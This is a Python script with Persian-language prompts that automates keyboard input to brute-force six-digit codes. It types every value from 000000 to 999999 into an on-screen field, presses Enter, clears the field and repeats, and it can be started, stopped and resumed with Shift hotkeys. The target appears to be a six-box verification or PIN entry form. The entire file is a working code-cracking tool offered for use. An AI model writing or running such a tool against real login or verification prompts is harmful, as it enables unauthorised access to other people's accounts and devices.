import pyautogui
import keyboard
import time
import sys


running = False
last_code = "000000"

def start_cracking():

    global running, last_code
    if running:
        print("\nعملیات از قبل در حال اجراست.")
        return

    print("\nکلید میانبر دریافت شد. لطفاً کلیدها را رها کنید...")
    time.sleep(0.4) 

    running = True
    print("="*30)
    print("شروع عملیات... (برای توقف Shift+Y را بزنید)")
    print("="*30)

    try:
        start_num = int(last_code)
    except ValueError:
        start_num = 0


    for i in range(start_num, 1000000):
        if not running:
            print("\nعملیات توسط کاربر متوقف شد.")
            break

        code = str(i).zfill(6)
        last_code = code


        pyautogui.write(code, interval=0.02)

        pyautogui.press('enter')
        

        time.sleep(0.3)


        pyautogui.press('backspace', presses=6, interval=0.01)


        sys.stdout.write(f"\rکد تست شده: {code}")
        sys.stdout.flush()

    running = False
    if i == 999999:
        print("\nتمام کدهای ممکن تست شدند.")
    print(f"\nآخرین کد تست شده: {last_code}")


def stop_cracking():

    global running
    if running:
        running = False
        print("\nدر حال توقف عملیات...")


keyboard.add_hotkey('shift+t', start_cracking)
keyboard.add_hotkey('shift+y', stop_cracking)

print("برنامه آماده است.")
print("1. با ماوس روی **اولین کادر** از شش کادر ورودی کلیک کنید.")
print("2. برای شروع، کلیدهای Shift + T را فشار دهید.")
print("3. برای توقف دستی، کلیدهای Shift + Y را فشار دهید.")
print("\nبرای خروج کامل از برنامه، این پنجره را ببندید یا Ctrl+C را بزنید.")

keyboard.wait()